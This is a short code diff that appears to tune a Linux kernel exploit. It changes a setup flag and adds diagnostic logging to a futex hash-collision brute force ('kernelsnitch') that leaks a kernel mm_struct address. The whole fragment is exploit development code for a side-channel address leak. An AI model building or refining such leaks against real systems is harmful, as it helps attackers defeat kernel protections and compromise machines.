@@ -702,7 +702,7 @@ uintptr_t prepare_kernel_page() {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -753,9 +753,12 @@ uintptr_t prepare_kernel_page() {
     futex_hashsize = try_sizes[h];
     ks->mm_struct = (size_t)-1;
     ks->found = 0;
+    ks->diag_max_pass = 0;
     ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     pr_info("trying futex_hashsize=%zu\n", futex_hashsize);
     kernelsnitch_bruteforce(ks);
+    pr_info("max pass count for hashsize=%zu: %zu/%zu\n",
+            futex_hashsize, ks->diag_max_pass, ks->collisions);
     if (ks->mm_struct != (size_t)-1) {
       leaked = ks->mm_struct;
       winning_hashsize = futex_hashsize;
